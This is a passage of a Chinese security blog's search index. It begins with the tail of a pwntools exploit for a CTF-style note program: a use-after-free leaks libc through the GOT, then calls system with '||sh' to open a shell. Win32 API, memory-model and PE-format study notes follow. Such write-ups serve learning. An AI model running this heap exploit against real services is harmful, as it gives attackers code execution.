p.sendline(b&quot;3&quot;)      p.recvuntil(b&quot;Index :&quot;)      p.sendline(index)#p.interactive()add_note(b&quot;16&quot;,b&quot;aaaaa&quot;)add_note(b&quot;16&quot;,b&quot;aaaaa&quot;)delete_note(b&#39;0&#39;)delete_note(b&#39;1&#39;)add_note(b&#39;8&#39;,p32(pfputs)+p32(read_got))print_note(b&#39;0&#39;)pfread = u32(p.recv()[0:4])pfsys = pfread - 0xd41c0 + 0x3a940#p.interactive()delete_note(b&#39;2&#39;)#p.interactive()#p.recv()#p.interactive()add_note(b&#39;8&#39;,p32(pfsys)+b&quot;||sh&quot;)print_note(b&#39;0&#39;)p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn,知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解密系列basic</title>
      <link href="/2023/09/01/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%5B%E5%9F%BA%E7%A1%80%E7%AF%87%5D/"/>
      <url>/2023/09/01/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%5B%E5%9F%BA%E7%A1%80%E7%AF%87%5D/</url>
      
        <content type="html"><![CDATA[<p><em>解密系列[基础篇]</em></p><h3 id="多字节存储顺序"><a href="#多字节存储顺序" class="headerlink" title="多字节存储顺序"></a><strong>多字节存储顺序</strong></h3><p>两种编码区别:<br>**Big-Endian:**高位字节存入低地址，低位字节存入高地址，依次排列。<br>**Little-Endian :**低位字节存入低地址，高位字节存入高地址，反序排列         多字节数据存放顺序与CPU有关。</p><p>微处理器中存放顺序有正序（ Big-Endian）和逆序(Little-Endian） (也称大端存储和小端存储)之分。<br>常见的Intel系列使用的编码方式属于Little-Endian类；某些RISC架构的CPU·OIBM6Power-PC等属于Big-Endian类。</p><p>补充：ASCII （ American Standard Code for InformationInterchange·美国信息互换标准代码) 0-256。<br>Unicode字符编码的编码范围是︰0-65535·它包含三套编码方式如 :UTF-8·UTF-16和UTF-32·它和ASCII的关系为ASCII字符编码是Unicode字符编码的一部分。</p><h3 id="Win-API简介"><a href="#Win-API简介" class="headerlink" title="Win API简介:"></a><strong>Win API简介:</strong></h3><p>Windows API就是windows应用程序接口，是针对microsoft windows操作系统家族的系统编程接口，这样的系统包括Windows 7 ·Windows Vista - WindowsXP -Windows Server 2003 ·Windows 2000-Windows95 ·Windows 98-Windows Me (Millennium Editon）和OWindows CE等几乎所有版本。它被设计为各种语言的程序调用，也是应用软件与Windows系统最直培的交互方式。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/IZFRQK66[MK~]3S%7D62$Y4KJ.png" alt="img"></p><p><strong>动态链接库</strong>︰动态链接就是把一些经常会共用的代码（静态链培的OBJ程序库）制作成DLL文件。当可执行文件调用到DLL文件内的函数时windows操作系统才会把DLL文件加载存储器内。<br>DLL文件本身的结构就是执i行文件（PE） ,当程序需求函数才进行链接，通过动态链接方式，存储器浪费的情形将大幅降低。                           <strong>kernel32.dll</strong>:控制着系统的内存管理﹑数据的输入输出操作和中断处理。当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。<br><strong>user32.dll</strong>: Windows用户界面相关应用程序接口，用于包括Windows处理、基本用户界面等特性。如创建窗口和发送消息。<br><strong>gdi32.dll</strong>:是Windows GDI图形用户界面相关程序，包含的函数用来绘制图像和显示文字。   </p><p><strong>句柄</strong>：是整个windows编程的基础。<u>一个句柄是指使用的一个唯一的整数值</u><u>，用于标志应用程序中的不同对象和同类对象中的不同的实例</u>。<br>例：一个窗口，按钮，图标，滚动条，输出设备，控件或者文件等。应用程序能够通过句柄访问相应的对象的信息。<br>句柄是windows用来标志应用程序中建立的或是使用的唯一整数windows使用了大量的句柄来标志很多对象。</p><p>HWnd：带文本的窗口或控件的句柄。<br>IpString：指向接收文本的缓冲区的指针。<br>nMaxCount：指定要保存在缓冲区内的字符的最大个数，其中包含NULL字符      </p><h3 id="HWND-GetDlgItem函数"><a href="#HWND-GetDlgItem函数" class="headerlink" title="HWND GetDlgItem函数"></a><strong>HWND GetDlgItem函数</strong></h3><pre><code>hwndScroll = GetDlgItem(hwnd, IDC_SCROLL);       </code></pre><p> 假设一个父窗口中有多个子窗口，那么本函数是返回一个子窗口句柄。第一个参数：父窗口句柄     第二个参数：子窗口    UINT </p><h3 id="IDUINT-GetDlgItemText函数"><a href="#IDUINT-GetDlgItemText函数" class="headerlink" title="IDUINT GetDlgItemText函数"></a><strong>IDUINT GetDlgItemText函数</strong></h3><p>​<br>（检索与对话框中的控件关联的标题或文本）                                                                                 </p><pre><code>GetDlgItemText(  HWND hDlg,       // handle to dialog box  int nIDDlgItem,  // control identifier  LPTSTR lpString, // pointer to buffer for text  int nMaxCount    // maximumsize of string);                                      </code></pre><h3 id="GetwindowText函数"><a href="#GetwindowText函数" class="headerlink" title="GetwindowText函数"></a><strong>GetwindowText函数</strong></h3><p>将指定窗口的标题条文本（如果存在）拷贝到一个缓存区内。             如果指定的窗口是一个控件，则拷贝控件的文本。                <u>GetWindowText不能接收在其他应用程序中的控件的文本。</u></p><pre><code>int GetWindowText(  HWND hWnd,        // handle to window or control  LPTSTR lpString,  // text buffer  int nMaxCount     // maximum number of characters to copy);</code></pre><h3 id="UINT-GetDlgItemInt函数"><a href="#UINT-GetDlgItemInt函数" class="headerlink" title="UINT GetDlgItemInt函数"></a><strong>UINT GetDlgItemInt函数</strong></h3><p>（将对话框中指定控件的文本转换为整数值）                                                     </p><pre><code>UINT GetDlgItemInt(  HWND hDlg,           // handle to dialog box  int nIDDlgItem,      // control identifier  BOOL *lpTranslated,  // success state  BOOL bSigned         // signed or unsigned value);</code></pre><h3 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox"></a>MessageBox</h3><p>（这个API方法用来创建、显示、操作一个消息框。它包含可设置的消息内容、标题，还可以添加预定义的图标、放置按钮）int </p><pre><code>int MessageBox(  HWND hWnd,          // handle to owner window  LPCTSTR lpText,     // text in message box  LPCTSTR lpCaption,  // message box title  UINT uType          // message box style);</code></pre><p>NT架构从内核到KERNEL32·USER32·GDI32都是纯32位实现。<br>NT架构标准字符集重头开发，统一使用Unicode字符集·兼容ASCII字符集。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/R~%60]HZH%7BDN_P3NYJL1V@MSF.png" alt="img"></p><p>区别：1.函数调用完后谁来清空栈2.入栈顺序（两者均自右向左）stdcall由子程序平衡栈 cdel（c语言标准）由调用值平衡栈回调函数。（callback）回调函数</p><p><img src="D:\Users\lenovo\Desktop\5.png"></p><p><img src="D:\Users\lenovo\Desktop\4.png"></p><p>Windows操作系统最大的特点就是其图形化的操作只面和多任务的管理。这些强大功能就是建立在其消息处理机制这个基础之上的。Windows系统与应用程序之间，应用程序与应用程序之间的通讯就是通过消息来触发，并靠对消息的响应和处理来完成。<br>Windows系统中有两种消息队列:一种是<strong>系统消息队列</strong>，另一种是<strong>应用程序消息队列</strong>。Windows本身是由消息驱动，当调试程序时跟踪一个消息会得到相当底层的答案。                                                                        Windows为当前执行的每个Windows程序维护一个消息队列。<u>在发生某事件之后，系统将该事件转换为一个消息，并将消息投放入程序消息队列中。</u>程序通过i行一块称之为消息循环的程序代码从消息队列中取出消息!其实∶<strong>消息不过是定义一个结构。定义一堆ID，在程序运行过程中调用switch case拦截去完成巳应的功能。</strong></p><pre><code>while(GetMessage (&amp;msg, NULL,0,0))                               &#123;TranslateMessage (&amp;msg);//翻译消息DispatchMessage (&amp;msg); &#125;//分配消总</code></pre><p><strong>SendMessage函数</strong>                                                                                将指定的消息发送到一个或多个窗口。</p><pre><code>LRESULT [SendMessage]（HWND hWnd，UINT Msg，WPARAM wParam，LPARAM IParam）；</code></pre><h3 id="WM-COMMAND"><a href="#WM-COMMAND" class="headerlink" title="WM_COMMAND"></a><strong>WM_COMMAND</strong></h3><p>产生的条件：点击<strong>菜单</strong>， 点击<strong>加速键</strong>（键盘快捷键，是一个或几个按键的组合，它用于激活特定的命令，使用加速键不需要费力移动鼠标就能激活菜单项），点击窗口<strong>按钮</strong>，点击<strong>工具栏按钮</strong>。这些时候都有command消息产生。<br> wParam 高两个字节 通知码<br>wParam 低两字节 命令ID<br>lParam 发送命令消息的子窗体句柄。<br> <strong>WM_GETTEXT</strong><br> <strong>WM_QUIT</strong><br><strong>WM_LBUTTONDOWN</strong><br><strong>WM_RBUTTONUP</strong><br><strong>WM_KEYUP</strong><br>（可自行查询相应用法及作用 我也是大懒虫捏【😀】）</p><h3 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a><strong>实模式</strong></h3><p>程序指令在执行过程中一般需要有各种数据,x86系列CS、DS、ES、FS、SS等用于指示不同用涂的数据段在内存中的位置。<br>x86系列使用中断机制来实现系统服务。<br>寄存器的扩展之路∶<br>8086以前（ 8bit） -&gt;8086（ 16bit） -&gt;80386(32bit)-&gt;现在的64bitCPU</p><p>寄存器（AL) -&gt;(AX)-&gt;（EAX）-&gt;(RAX)                                                         </p><h3 id="保护模式∶无论实模式还是保护模式根本的问题都为程序如何在其中运行。"><a href="#保护模式∶无论实模式还是保护模式根本的问题都为程序如何在其中运行。" class="headerlink" title="保护模式∶无论实模式还是保护模式根本的问题都为程序如何在其中运行。"></a><strong>保护模式</strong>∶无论实模式还是保护模式根本的问题都为程序如何在其中运行。</h3><p>和实模式下一样，保护模式下程序运行的实质仍是“CPU执行指令，操作相关数据”。主要改变的是寻址的方式，保护模式在寻址方式上“动了手脚””，为的是起到“保护作用”。</p><p><strong>保护模式</strong><br><u>一.不同任务之间的保护∶</u><br>通过把每个不同的任务放在不同的虚排地址空间中﹐来实现不同任务之间的隔离（即A程序不能访问和修改B程序的代码和数据）·以达到程序间的隔离;<br><u>二.同一任务的保护∶</u><br>在每一任务之内定义了4种保护级别·方别为0，1，2，3按环的方式表示.</p><p><img src="D:\Users\lenovo\Desktop\3.jpg"></p><p>其中，0级代表最高的权限级别，3级代表最低权限级别。按环的方式来表示。其中，环0、1、2为系统级，环3为用户级。<br>一般的系统只能使用环0和环3两个级别。                                             如上图所示，最外层的CodeAP1只能访问DataAP1。不能访问同级的另一应用程序的DataAP2;同样·CodeAP2只能访i6DataAP2 不能访DataAP1 。                                                                                            要说明的是：<strong>如果应用程序拥有第0级的权限，那么它就可以执行所有的指令并访问所有的数据。</strong><br>如果应用程序拥有的权限级别是第3级，它执行的指令是有限的，能访问的数据也是有限的（被保护)  。                                                                           操作系统的核心层是运行在Ring 0级。<br>WIN32子系统（KEDNET32.DLL 【内存的管理】USER32.DLL【操作用户的界面】 ，GDI32.DLL【操作图像的界面】等）是运行在Ring3级的，以提供与子程序的接口。</p><h3 id="虚拟内存（确实存在于硬盘中）∶"><a href="#虚拟内存（确实存在于硬盘中）∶" class="headerlink" title="虚拟内存（确实存在于硬盘中）∶"></a><strong>虚拟内存（</strong>确实存在于硬盘中）∶</h3><p>虚拟内存并不是真正的内存·它是通过射( Map）的方法﹐使用的虚拟地址（VA)达到4GB（因为EIP32位索引的最大范围是4GB）。<br>这样规定︰每个应用程序可以被分配到2GB的虚拟地址·剩下的2GB留给操作系统自己用。( Windows NT中·应用程序甚至有3GB为虚拟地址 )    </p><p>Windows是一个分时的多任务操作系统·CPU的时间被分割成一个个的时间片后行配给名个不同的应用程序·在一个时间片里，和这个应用程序护行无关的东西并不会又映射到线性地址中（这样EIP就索引不到）。</p><p>因比可以做到每个程序都拥有自己独立的4GB寻址空间·互不干扰。</p><p>要说明的是DLL与EXE不同【dll文件无自己的私有空间(动态链接文件）】</p><h4 id="简单的虚拟内存的实现方法和过程∶"><a href="#简单的虚拟内存的实现方法和过程∶" class="headerlink" title="简单的虚拟内存的实现方法和过程∶"></a><strong>简单的虚拟内存的实现方法和过程∶</strong></h4><p>1.当一个应用程序被启动时，操作系统创建一个新的进程，并给这个进程行配2GB的虚拟地址（不是内存哦 是地址)。<br>2.虚拟内存管理器将应用程序的代码射到哪个程序的虚拟地址中的某个位置，并把当前所需要的代码读取到内存物理地址中。<br>3.如果用动态链接库DLL，DLL程序也会被映射到进程的虚拟地址空i间在需要的时候才被读入物理内存。<br>4.其他项目(像数据﹑堆栈等)的空间是首先从物理内存中行配，再反向映射到虚拟地址空间中的。<br>5.应用程序通过使用的他的虚拟地址空间中的地址开始执行·然后由虚拟内存管理器把每次的内存访问映射到物理位置去。</p><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a><strong>小结：</strong></h3><p>一.应用程序是不会直接访i问物理地址的。<br>二.虚拟内存管理器通过虚拟地址的访问请求，控制所有的物理地址访问；<br>三.每个程序都有独立的4G寻址空间·不同程虚拟地址空间是被互相隔离的;                                                                                                          四.DLL程序没有巨己的“私有”空间·它们称之为动态链接库文件·它们总是被射到其他应用程序的地址空间中的﹐作为其他应用程序的一部行运行。<br>最后，使用虚拟内存的好处是︰简化了内存的管理，并弥补物理内存的不足。另外以防止多任务环境下各个应用程序之间的冲突!</p><h3 id="PE文件"><a href="#PE文件" class="headerlink" title="PE文件"></a><strong>PE文件</strong></h3><p>PE的意思就是Portable Executable （可移植的挖行体)。它是Windows环境身所带的e行体文件格式。<br>它的一些特性继承由Unix Coff (commonobject file format)文件格式。<br>“portable executable”（己移植的执行体）意味着此文件格式是跨win32平台的:也就是说即使Windows 运行在非IntelCPU 上·任意win32平台的PE装载器都能识别和使用该文件格式。</p><p>基本上所有win32执行体(除了VxD和16位的DI)都用PE文件格式，包括NT的内核模式驱动程序( kernel mode drivers ) 。因而研究PE文件格式给了我们洞悉 Windows结构的良机。<br>PE文件用的是一个平面地址空间·所有代码和数据都合并在一起·组成一个很大结构文件的内容被行割为不同的区块（Section又称为区段·节等)·块中包含代码或数据。</p><p>每个区块都有巨己在内存中的属性：可读&#x2F;写·只读等。<br>每个区块都有不同的名字，这用名字主要用来表示区块功能。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230131171812728.png" alt="image-20230131171812728"></p><p>PE文件非常好的一个地方就是在磁盘上的数据结构与在内存中的结构是一致的。<br>当至统装载一个己i行文件到内存中·主要就是将一个PE文件的某一部方映射到地址空间中·这样﹐PE文件的数据结沟在磁盘和内存中就是一样的了。</p><p><img src="D:\Users\lenovo\Desktop\1.png"></p><p>(1）入口点（Entry Point）<br>PE文件巳行时的入口点（Entry Point) 。也就是说·程序在执行时的第一行代码地址应该就是这个值·有点像8086汇编语言中end start中start指向的入口地址。<br>(2）文件偏移地址（File Offset）<br>当PE文件储存在磁盘上的时候·各数据的地址称作文件的移地址·文件偏移地址人PE文件的第一个字节开始计数·起始值为0。</p><h3 id="虚地地址-Virtual-Address-VA"><a href="#虚地地址-Virtual-Address-VA" class="headerlink" title="虚地地址(Virtual Address, VA)"></a><strong>虚地地址(Virtual Address, VA)</strong></h3><p>由于Windows程序运行在保护模式下·所以应用程序访问存储器所使用的逻辑地址称为虚拟地址（因为他不是真正的物理地址·真正的物理地址被windows妈妈的保护机制保护起来)﹐又称为内存偏移地址（Memory Offset) 。实地址模式下的“段址也写地址∶偏移地址索引方式类似·虚樽地;成“段∶偏移量”的形式·但不同之处在于这里的段不再是段地切而是指段选择子。<br>例t :”0123:004010003’<br>0123∶表示段选择子。其数据存储在CS段选择器里。同一程序在不同系统环境下此值可能不同，因比我们不需要关心。<br>00401000∶此处表示内存中的虚拟地址。一般来说，同一个程序的向一条指令在不同系统环境下，此值相同（PE映射原理）。</p><h3 id="基地址（-ImageBase"><a href="#基地址（-ImageBase" class="headerlink" title="基地址（ ImageBase)"></a><strong>基地址（ ImageBase)</strong></h3><p>文件执行时将被映射到指定内存地址中·这个初始内存地址称为基地址。这个值是由PE文件本身设定的。<br>控照默认设置·用Visual C++建立的EXE文件基地址是00400000h。DLL支件基地址是10000000h。但这个值可自己在编译器设定的。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>荒诞</title>
      <link href="/2023/08/27/%E8%8D%92%E8%AF%9E/"/>
      <url>/2023/08/27/%E8%8D%92%E8%AF%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="yub‘s-blog"><a href="#yub‘s-blog" class="headerlink" title="yub‘s blog"></a>yub‘s blog</h2><p>向着彩虹海出发！</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/1.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 碎片 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
